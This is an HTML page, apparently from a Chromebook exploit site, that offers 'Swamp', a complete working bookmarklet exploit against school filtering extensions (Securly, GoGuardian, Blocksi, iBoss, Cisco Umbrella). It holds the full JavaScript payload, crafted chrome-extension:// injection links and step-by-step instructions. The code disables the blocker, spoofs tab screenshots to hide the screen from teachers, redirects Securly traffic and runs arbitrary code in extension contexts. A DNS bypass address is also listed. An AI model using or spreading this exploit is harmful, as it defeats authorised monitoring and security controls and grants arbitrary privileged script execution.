@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Swamp - Chrome OS Exploits</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="icon" href="../../assets/icon.png">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Google+Sans">
+        <link rel="stylesheet" href="../../main.css">
+        <link rel="stylesheet" href="../detail.css">
+        <script src="../addheader.js"></script>
+        <script>
+            window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+            ga('create', 'UA-XXXXX-Y', 'auto');
+            ga('send', 'pageview');
+        </script>
+    <meta name="google-site-verification" content="weY0_IfasLpB3jj53TSPZIfHSBY2obh-2hIuFTVIrhw" /></head>
+    <body>
+        <div id="main-content">
+        <h3>
+            <span class="title">Swamp</span>
+            <br>
+            <small>Bypassi#7037</small>
+            <p>
+            <a href="https://raw.githubusercontent.com/3kh0/ext-remover/main/newpointblank.js" target="_blank">
+                <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code UnderlineNav-octicon d-none d-sm-inline">
+                    <path d="m11.28 3.22 4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L13.94 8l-3.72-3.72a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215Zm-6.56 0a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042L2.06 8l3.72 3.72a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L.47 8.53a.75.75 0 0 1 0-1.06Z"></path>
+                </svg>
+                Source
+            </a>
+        </h3>
+        <div class="note">
+            Bookmarklets must not be blocked by policy to perform this exploit.
+        </div>
+        <p>
+        <center>
+            <a class="bookmarklet" href="javascript:(document = window.document), document.write(&quot;<html><body><center><head><h1>Point-Blank <small>Swamp</small></h1><center><h3>Tampering</h3></center>\n<center><button id='soft'>Soft Disable</button><button id='hard'>Hard Disable</button></center><center><button id='reload'>Reload this extension</button></center><center><center><h3>Scripts</h3></center><center><button id='hide'>Hide tabs</button><button id='cool'>Create Fancy Window</button></center><center><h3>Custom Notification</h3></center><input id='title' placeholder='Title'><input id='messer' placeholder='Message'><button id='notification'>Show Notification</button></center><center><button id='dns'>DNS Emulator</button><center></center><center><center><center><h3>Background Scripts Console</h3></center><textarea  id='code' placeholder='Enter Code Here'></textarea></center><center><button id='google'>Run on Google</button><button id='when'>Run on extension click</button></center><center></center></body>\n</html>\n <style>body {user-select: none;} textarea{border-radius: 25px; margin: 1 auto;margin-center: auto;margin-center: auto; text-align: center; align: center; display:inline-block;height:400px}*{box-sizing:border-box}body{padding:13px;font-size:110%;color:#fff;background-color:#2e2e31}h1{text-align:center;font-size:70px}h2{text-align:left;font-size:175%}input {border-radius: 12px; color:#000;font-size:15px} textarea {border-radius: 21px; color:#000;font-size:15px} button,pre { border-radius: 12px; color:#000;font-size:15px}h1,h2,h3,h4,button,label,p,select{font-family:Roboto,sans-serif}hr{border:none;border-bottom:3px solid #fff}input,kbd,pre,textarea{ border-radiusfont-family:monospace;border:none}input,select,textarea{background-color:#fff;border-radius:25px; padding:13px 17px;border:none}button,input{background-color:#fff;padding:13px 100px;margin:20 5px 5px 0}input{width:600px;border-radius:25px}textarea{white-space:pre;float:center;width:60%;border-radius:25px; 0 0 10px;resize:none;background-color:#99edc3;margin-bottom:15px}pre{border-radius:25; 10px 10px 0;padding:13px;float:right;margin:0 0 25px;width:40%;overflow-y:scroll;word-break:break-all;white-space:pre-line;background-color:#1c8e40}button{border:none; cursor:pointer;transition:filter 250ms}button:hover{filter:brightness(.8)}.gg{background-color:#99edc3}a{color:#99edc3;transition:color 250ms}a:hover{color:#1c8e40}%3C/style%3E\n%22  ),  document.getElementById(%22hide%22).addEventListener(    %22click%22,    function () {      alert(        %22This will open a window, which your teacher will only be able to see the window this opens, so open another one after this one opens%22      ),        (opener.chrome.tabs.captureVisibleTabAsync =          opener.chrome.tabs.captureVisibleTabAsync || screenshot_old);      opener.chrome.windows.getAllAsync =        opener.chrome.windows.getAllAsync || get_tabs_old;      clearInterval(spoof_int);      if (spoof_int) alert(%22Your teacher can't see your screen now!%22);      spoof_int = null;      %60            : %60;      var spoof_int,        visible_id = 0,        screenshot_old =          screenshot_old || opener.chrome.tabs.captureVisibleTabAsync,        get_tabs_old = get_tabs_old || opener.chrome.windows.getAllAsync,        get_tabs_new = function () {          return new Promise((resolve, reject) =%3E {            get_tabs_old({              populate: true,              windowTypes: [%22normal%22],            }).then((tabs) =%3E {              tabs.forEach((tab) =%3E {                if (tab.id === visible_id) resolve([tab]);              });            });          });        };      opener.chrome.windows.create({ url: %22https://google.com%22 }, (win) =%3E {        visible_id = win.id;        spoof_int = setInterval(() =%3E {          opener.chrome.windows.getLastFocused((window) =%3E {            var visible = window.id === visible_id;            opener.chrome.tabs.captureVisibleTabAsync = visible              ? screenshot_old              : null;            opener.chrome.windows.getAllAsync = visible ? get_tabs_new : null;          });        }, 5);      });    },    !1  ),  document.getElementById(%22cool%22).addEventListener(    %22click%22,    function () {      opener.chrome.windows.create({        url: %22https://www.google.com%22,        type: %22popup%22,      });    },    !1  ),  document.getElementById(%22dns%22).addEventListener(    %22click%22,    function () {     opener.chrome.webRequest.onBeforeRequest.addListener(  () =%3E {    return { redirectUrl: %22javascript:%22 };  },  {    urls: [%22*://*.securly.com/*%22],  },  [%22blocking%22]);    },    !1  ),  document.getElementById(%22notification%22).addEventListener(    %22click%22,    function () {      opener.chrome.notifications.create(null, {        type: %22basic%22,        iconUrl:          %22https://upload.wikimedia.org/wikipedia/en/9/9a/Trollface_non-free.png%22,        title: %22%22 + document.getElementById(%22title%22).value,        message: %22%22 + document.getElementById(%22messer%22).value,      });    },    !1  ),  document.getElementById(%22google%22).addEventListener(    %22click%22,    function () {      alert(%22Go to google.com to see your code%22);      javascript:(function(){opener.chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) =%3E {  if (changeInfo.status == %22complete%22 && tab.url.includes('google.com')) {    opener.chrome.tabs.executeScript(      tabId, { code: %60      %60 + document.getElementById(%22code%22).value             }    );  }})})()    },    !1  ),  document.getElementById(%22hard%22).addEventListener(    %22click%22,    function () {      javascript: (localStorage.cluster =        %22UNKNOWN_SCHOOL,%22 +        (confirm(%22This will disable your blocker until the removal of your account, if you want something less permanent use soft disable, continue?%22)          ? 99999999999999          : 0)),        opener.chrome.extension.getBackgroundPage().location.reload();    },    !1  ),  document.getElementById(%22reload%22).addEventListener(    %22click%22,    function () {      localStorage.cluster = %22UNKNOWN_SCHOOL,0%22;      opener.chrome.runtime.reload();    },    !1  ),  document.getElementById(%22soft%22).addEventListener(    %22click%22,    function () {  document.getElementById(%22soft%22).innerHTML = %22<b>Disabled</b>%22; document.getElementById(%22soft%22).style.border = '1px solid firebrick';      opener.chrome.extension.getBackgroundPage().close();    },    !1  ),  document.getElementById(%22when%22).addEventListener(    %22click%22,    function () {      opener.chrome.browserAction.onClicked.addListener(() =%3E {        opener.chrome.tabs.query(          { active: true, currentWindow: true },          (tab) =%3E {            opener.chrome.tabs.executeScript(tab[0].id, {              code:                %60      %60 + document.getElementById(%22code%22).value,              matchAboutBlank: true,            });          }        );      });      alert(%22Everytime you click your extension, your code will show%22);    },    !1  );" onclick="return false;">Swamp</a>
+            <p style="font-size: 10px;">
+            (Drag to bookmarks bar)
+        </center>
+        <ol>
+            <h3>Instructions</h3>
+            <li>Drag one of the following pages that corresponds to your extension into empty tab space:</li>
+            <br>
+            <a class="swampBtn" style="background-color: rgb(255, 255, 230); border: 1px dashed gray;" title="Patched in later versions of Securly." href="https://tinyurl.com/bettergoofcurly" target="_blank" onclick="alert('Drag this to empty tab space.'); return false;">
+                <image height="15px" src="https://lh3.googleusercontent.com/60Ox6Y0bbnUrHSvKMj4WPstHY8afmKsgjBeZegbdX50yG5pcxntO4y2PAJaSLtvPGNYhupYHV8g2ents_eUmR8Y_=w128-h128-e365-rj-sc0x00ffffff"></image>
+                Securly
+            </a>
+            <a class="swampBtn" style="background-color: rgb(255, 255, 230); border: 1px dashed gray;" title="Patched in later versions of GoGuardian." href="https://tinyurl.com/goofguardian" target="_blank" onclick="alert('Drag this to empty tab space.'); return false;">
+                <image height="15px" src="https://support.goguardian.com/servlet/rtaImage?eid=ka04N000000ocqe&feoid=00N1K00000ed3rb&refid=0EM4N000003LlZZ"></image>
+                GoGuardian
+            </a>
+            <a class="swampBtn" href="chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html?blockurl={%22hostname%22:%22%3Ca%20href=%27//%27%20rel=%27opener%27%20target=%27_blank%27%3E%3Cdiv%3E%3Ch1%3E%3Ch1%3E%3Ch1%3E%3Ch1%3E%3Ch1%3E%3Ch1%3E%3Ch1%3E%3Ch1%3E%3Ch1%3E%3Ch1%3E%3Cu%3EClick%20Me!%3C/u%3E%3C/h1%3E%3C/h1%3E%3C/h1%3E%3C/h1%3E%3C/h1%3E%3C/h1%3E%3C/h1%3E%3C/h1%3E%3C/h1%3E%3C/h1%3E%3C/div%3E%3C/a%3E%22}" target="_blank" onclick="alert('Drag this to empty tab space.'); return false;">
+                <image height="15px" src="https://lh3.googleusercontent.com/2H2R0ZsFykpPpSBGJPz-_uIk7Oh1ECkHMCfIMA7vSF8GNZvJdCCM6aqkj_4OSb5ZgS46--CR4F66jjwL7hN0ZEwZ7A=w128-h128-e365-rj-sc0x00ffffff"></image>
+                Blocksi
+            </a>
+            <a class="swampBtn" href="chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html?re=1&bc=%3Ca%20href=%22about:blank%22%20target=%22_blank%22%20rel=%22opener%22%20style=%22position:%20fixed;%20left:%200px;%20top:%200px;%20background:%20white;%20color:%20black;%20display:%20block;%20width:%20100%25;%20height:%20100%25;%20transform:%20scale(2.5);%20display:%20flex;%20justify-content:%20center;%20align-items:%20center;%20%22%3E%3Cdiv%3EClick%20Me%3C/div%3E%20%3C/a%3E" target="_blank" onclick="alert('Drag this to empty tab space.'); return false;">
+                <image height="15px" src="https://lh3.googleusercontent.com/zaFZuivjaV3VaC8kLZO4HaS2JnnnPY_Zl7vBT8EIax8gnrWaYxP25jh7E2oPGAy_8G7xHEP3NCZomStqgkPdtvT-fA=w128-h128-e365-rj-sc0x00ffffff"></image>
+                iBoss
+            </a>
+            <a class="swampBtn" href="https://tinyurl.com/goofumbrella" target="_blank" onclick="alert('Drag this to empty tab space.'); return false;">
+                <image height="15px" src="https://lh3.googleusercontent.com/thMy04V_e8JWEEsrZy1Cpg7R3FeoF1jKRyZMWXC_OT1frTUcP7geypfbpJcaVuRug-h2rK9IZIWDtWkb5KX4KM_29w=w128-h128-e365-rj-sc0x00ffffff"></image>
+                Cisco Umbrella
+            </a>
+            <li>Click the link that opens a blank page.</li>
+            <li>Click either soft disable or hard disable.</li>
+        </ol>
+        <h3>DNS Method</h3>
+        <center>
+            <input readonly class="copy" value="150.136.6.90" title="Copy to clipboard" onclick="navigator.clipboard.writeText(this.value);"></input>
+            <p style="font-size: 10px;">
+            (Hosted by TheGreatestGiant | Hosting has ended for this address)
+            <p>
+            <iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/CDOCQviQRKM?si=gpk0CqnJA8OnpuFh&amp;start=10" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
+        </center>
+        <h3>Extra Notes</h3>
+        It is recommended to use the soft disable option, which lasts until you restart the Chromebook.
+        <p>
+        Swamp provides extra script buttons and a background script console to run custom scripts. JavaScript might not work for some extensions.
+        </div>
+    </body>
+</html>
